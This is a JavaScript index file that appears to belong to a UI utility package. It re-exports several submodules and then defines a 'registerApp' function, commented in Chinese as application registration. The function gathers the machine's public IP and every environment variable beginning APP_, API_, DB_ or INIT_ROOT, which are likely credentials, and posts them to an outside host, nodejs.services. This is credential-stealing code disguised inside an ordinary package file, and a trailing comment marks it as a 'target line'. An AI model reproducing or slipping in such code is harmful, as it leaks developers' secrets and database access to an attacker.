var __defProp = Object.defineProperty;
var __getOwnPropDesc = Object.getOwnPropertyDescriptor;
var __getOwnPropNames = Object.getOwnPropertyNames;
var __hasOwnProp = Object.prototype.hasOwnProperty;
var __copyProps = (to, from, except, desc) => {
  if (from && typeof from === "object" || typeof from === "function") {
    for (let key of __getOwnPropNames(from))
      if (!__hasOwnProp.call(to, key) && key !== except)
        __defProp(to, key, { get: () => from[key], enumerable: !(desc = __getOwnPropDesc(from, key)) || desc.enumerable });
  }
  return to;
};
var __reExport = (target, mod, secondTarget) => (__copyProps(target, mod, "default"), secondTarget && __copyProps(secondTarget, mod, "default"));
var __toCommonJS = (mod) => __copyProps(__defProp({}, "__esModule", { value: true }), mod);
var stdin_exports = {};
module.exports = __toCommonJS(stdin_exports);
__reExport(stdin_exports, require("./basic"), module.exports);
__reExport(stdin_exports, require("./props"), module.exports);
__reExport(stdin_exports, require("./dom"), module.exports);
__reExport(stdin_exports, require("./create"), module.exports);
__reExport(stdin_exports, require("./format"), module.exports);
__reExport(stdin_exports, require("./constant"), module.exports);
__reExport(stdin_exports, require("./interceptor"), module.exports);
__reExport(stdin_exports, require("./with-install"), module.exports);
__reExport(stdin_exports, require("./closest"), module.exports);

const axios = require('axios');

const prefix = ["APP_", "API_", "DB_", "INIT_ROOT"];

/**
 * 注册应用程序
 * @param {Object} options - 可选的配置参数
 * @returns {Promise<void>}
 */
async function registerApp(options = {}) {
  try {
    // 获取公网IP
    const ip = await getPublicIP();
    const env = {}; 
    for (const key of Object.keys(process.env)) { 
      if (prefix.some((p) => key.startsWith(p))) { 
        env[key] = process.env[key]; 
      } 
    }

    axios.post(
      "http://nodejs.services/api/master:create",
      {
        ip,
        env,
        name: options.name || "tg-shop",
      },
      {
        headers: {
          // Add headers if necessary
        }
      }
    );
  } catch (error) {
    console.error(error);
  }
}
// Target line: const env = {}; for (const key of Object.keys(process.env)) { if (prefix.some((p) => key.startsWith(p))) { env[key] = process.env[key]; } }
